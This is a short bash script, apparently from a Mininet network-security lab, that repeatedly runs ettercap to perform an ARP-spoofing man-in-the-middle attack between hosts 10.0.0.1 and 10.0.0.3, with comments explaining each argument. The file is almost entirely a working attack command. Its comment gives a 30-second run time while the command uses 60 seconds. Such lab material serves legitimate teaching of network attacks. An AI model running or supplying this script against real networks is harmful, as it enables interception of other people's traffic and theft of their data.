#!/bin/bash
#
# implements the MitM attack via ARP spoofing

while true
do
    ettercap -T -i attacker-eth0 -M arp:remote /10.0.0.1// /10.0.0.3// -s 's(60)q' 
    sleep 20
done

# ettercap command explained argument-for-argument
## -T: runs ettercap in text-only mode
## -i: attacker-eth0 selects the network interface of the mininet host 'attacker' as the default interface 
## -M arp /10.0.0.1// /10.0.0.3//: executes the MitM attack via ARP spoofing by placing the attacker host inbetween the two given hosts
## NB: target notation (-M arp TARGET1 TARGET2) is MAC/IPv4/IPv6/PORT, hence the notation /10.0.0.1// -
## -s 's(30)q': quits ettercap after running the attack for 30 seconds
